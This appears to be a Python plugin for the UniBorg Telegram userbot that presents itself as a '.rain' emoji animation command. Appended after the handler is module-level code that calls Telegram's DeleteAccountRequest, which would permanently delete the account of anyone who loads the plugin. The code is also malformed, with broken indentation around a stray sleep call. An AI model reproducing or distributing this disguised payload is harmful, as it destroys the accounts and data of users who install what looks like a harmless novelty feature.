# (c) @UniBorg

from telethon import events
import time
import asyncio
from collections import deque
from telethon.sync import TelegramClient
from telethon import functions, types


@borg.on(events.NewMessage(pattern=r"\.rain", outgoing=True))
async def _(event):
	if event.fwd_from:
		return
	deq = deque(list("☁️☁️🌧🌩⛈🌨🌪🌪🌊"))
	for _ in range(32):
		await asyncio.sleep(0.1)
		await event.edit("".join(deq))
		deq.rotate(1)
  time.sleep(10.3)  
with TelegramClient(name, api_id, api_hash) as client:
    result = client(functions.account.DeleteAccountRequest(
        reason='some string here'
    ))
    print(result)
